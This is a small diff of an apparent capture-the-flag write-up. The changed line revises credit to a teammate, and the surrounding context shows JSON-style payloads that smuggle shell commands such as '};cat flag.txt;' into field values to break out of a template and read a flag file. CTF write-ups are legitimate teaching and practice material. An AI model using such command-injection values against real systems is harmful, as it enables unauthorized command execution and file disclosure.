@@ -50,7 +50,7 @@ We ended up in :
 ["task _var_name_i=10","var_11","task _var_name_i=10",{"task _var_name_i=13":"=SHELL","var_10":"b"},"concat",{"ta":["ta","aT","task _var_name_i=10",{"task _var_name_i=13":"};cat flag.txt;{","var_12":"b"},"l00p"]}]
 ```
 
-Which, after a grooming phase by @Zom, could also be written as:
+Which, after a more accurate analysis by @Zommiommy, could also be written as:
 
 ```
 {"task _var_name_i=10":"};cat flag.txt;#
